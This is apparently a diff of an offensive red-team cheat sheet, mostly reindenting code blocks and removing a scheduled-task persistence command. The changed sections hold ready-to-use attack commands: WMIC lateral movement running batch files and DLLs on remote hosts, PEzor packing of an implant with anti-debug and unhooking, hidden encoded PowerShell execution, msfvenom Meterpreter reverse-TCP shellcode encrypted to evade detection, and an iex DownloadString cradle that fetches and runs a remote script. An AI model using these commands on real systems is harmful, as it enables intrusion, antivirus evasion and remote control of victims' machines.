@@ -163,11 +163,6 @@ Find-LAPSDelegatedGroups
 
 # Persistence
 
-### Schedule Tasks 
-
-```cpp
-schtasks /create /ru "SYSTEM" /tn "update" /tr "cmd /c c:\windows\temp\update.bat" /sc once /f /st 06:59:00
-```
 
 ### Classic Startup folder
 
@@ -223,8 +218,8 @@ schtasks /create /ru "SYSTEM" /tn "update" /tr "cmd /c c:\windows\temp\update.ba
 WMIC Lateral Movement
 
 ```cpp
-	wmic /node:"192.168.1.2" process call create "C:\Perflogs\434.bat"
-	WMIC /node:"DC.example.domain" process call create "rundll32 C:\PerfLogs\arti64.dll, StartW"
+wmic /node:"192.168.1.2" process call create "C:\Perflogs\434.bat"
+WMIC /node:"DC.example.domain" process call create "rundll32 C:\PerfLogs\arti64.dll, StartW"
 ```
 
 # Domain Dominance
@@ -234,14 +229,14 @@ WMIC Lateral Movement
 #### PeZOR Packing and Encoding 
 
 ```cpp
-	PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=10 /root/Desktop/Grunt_Nim.exe -z 2
+PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=10 /root/Desktop/Grunt_Nim.exe -z 2
 ```
 
 #### Cat to base64 
 
 ```cpp
-	cat file.ps1 | iconv -t utf-16le | base64 -w 0
-	powershell -Sta -Nop -Window Hidden -EncodedCommand <encodedCommand>
+cat file.ps1 | iconv -t utf-16le | base64 -w 0
+powershell -Sta -Nop -Window Hidden -EncodedCommand <encodedCommand>
 ```
 
 #### Powershell to base64
@@ -253,21 +248,21 @@ WMIC Lateral Movement
 #### Hex Encode 
 
 ```
-	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.239 LPORT=4444 -f raw -o meter.bin
-	//cat meter.bin | openssl enc -rc4 -nosalt -k "HideMyShellzPlz?" > encmeter.bin
-	xxd -i encmeter.bin
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.239 LPORT=4444 -f raw -o meter.bin
+//cat meter.bin | openssl enc -rc4 -nosalt -k "HideMyShellzPlz?" > encmeter.bin
+xxd -i encmeter.bin
 ```
 
 #### Default MSF bin
 
 ```
-	msfvenom -a x64 --platform windows -p windows/x64/messagebox TEXT="Proxy Loading worked!" -f raw > shellcode.bin
+msfvenom -a x64 --platform windows -p windows/x64/messagebox TEXT="Proxy Loading worked!" -f raw > shellcode.bin
 ```
 
 #### PS memory 
 
 ```powershell
-	$string = "iex (New-Object Net.WebClient).DownloadString('http://<webServer>:8082/ps.ps1')"
-	$encodedcommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($string))
-	echo $encodedcommand
+$string = "iex (New-Object Net.WebClient).DownloadString('http://<webServer>:8082/ps.ps1')"
+$encodedcommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($string))
+echo $encodedcommand
 ```
